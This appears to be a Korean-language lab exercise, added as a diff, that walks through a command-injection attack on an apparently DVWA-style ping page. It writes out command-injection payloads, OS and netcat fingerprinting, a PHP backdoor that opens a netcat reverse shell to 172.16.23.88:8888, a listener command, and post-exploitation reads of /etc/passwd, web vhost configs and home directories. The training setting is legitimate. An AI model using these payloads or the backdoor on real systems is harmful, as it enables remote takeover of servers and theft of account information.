@@ -1,0 +1,39 @@
+리버스 쉘 실습 명령어
+1. 정보 수집 및 분석
+  1-1. ping 결과를 통해 OS를 유추해본다. (정보 수집) : 127.0.0.1
+
+  1-2. 다른 값들을 사용할 수 있는지 확인 (취약점 분석) : 127.0.0.1 && ls -l
+      
+
+  1-3. 서버 상세 OS 확인
+      - Linux : 127.0.0.1 && cat /etc/os-release
+      - Win : 127.0.0.1 && ver
+
+  1-4. netcat 설치여부 확인
+     - Rocky : 127.0.0.1 && dnf list --installed | grep nc
+     - Ubuntu : 127.0.0.1 && dpkg -l | grep netcat
+     - Win : 127.0.0.1 && where nc
+
+2. 백도어 코드 주입
+코드 : 127.0.0.1 && echo """ <?php shell_exec('nc 172.16.23.88 8888 -e /bin/sh'); ?>""" > backdoor.php
+
+p
+3. 백도어 코드 실행 및 원격 접속
+  3-1. 자신의 Kali에서 nc 명령어로 서버를 구동한다 : nc -lvp 8888
+
+  3-2. URL에 다음의 값을 입력한다 : http://[자신의 도메인]/vulnerabilities/exec/backdoor.php
+
+4. 공격
+  4-1. 자신의 kali에서 연결된 것을 확인한다.
+
+  4-2. 다음의 명령어를 순서대로 작성한다.
+        - cat /etc/passwd
+        - Rocky : cat /etc/httpd/conf.d/vhost.conf
+        - Ubuntu : cat /etc/apache2/sites-available/vhost.conf
+        - ls -al /home
+
+4번과 같이 한 이유
+공격자 입장에서 더 취약한 곳은 없는지 정보를 더 수집하기 위해서 실행했다.
+1. 생성된 계정 정보 확인
+2. 웹 사이트 더 구동중인 것이 있는지 확인
+3. 계정 디렉터리에 부여된 권한 정보 확인 (취약한 부분이 있는지 확인하는 작업)
